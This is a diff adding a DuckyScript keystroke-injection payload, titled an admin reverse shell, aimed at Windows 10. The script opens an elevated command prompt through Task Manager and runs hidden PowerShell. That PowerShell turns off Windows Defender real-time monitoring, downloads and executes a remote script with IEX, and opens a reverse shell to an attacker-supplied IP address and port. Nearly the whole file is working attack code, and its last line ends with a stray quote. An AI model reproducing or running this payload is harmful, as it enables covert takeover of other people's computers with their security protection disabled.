@@ -1,0 +1,33 @@
+REM Title: Admin Reverse shell
+REM Author: Naitik Dharmendra Joshi
+REM Description: Opens cmd and with admin privileges and starts a reverse shell in hidden Powershell window
+REM Target: Windows 10 (CMD, Powershell)
+REM Version: 1.0
+REM Category: General
+
+REM Change the Following Details.
+REM [LISTENER_IP_ADDRESS] IP Address of the Attacker System.
+REM [PORT] The Port on the target system you want Netcat to listen on.
+
+DELAY 300
+GUI r
+DELAY 20
+REM --> Opens Task Manager
+STRING taskmgr
+DELAY 150
+ALT f
+n
+DELAY 50
+REM --> Starts CMD
+STRING cmd
+TAB
+REM --> Turn On Admin Privileges
+SPACE
+REM --> Run
+ENTER
+DELAY 20
+
+REM --> Kills TaskManager, Executes PowerShell Commands (Hidden), Disables Windows Defender and Executes a Reverse Shell
+STRING taskkill /IM taskmgr.exe && powershell -WindowStyle hidden Set-MpPreference -DisableRealtimeMonitoring $true; IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell [LISTENER_IP_ADDRESS] [PORT]");
+
+ 
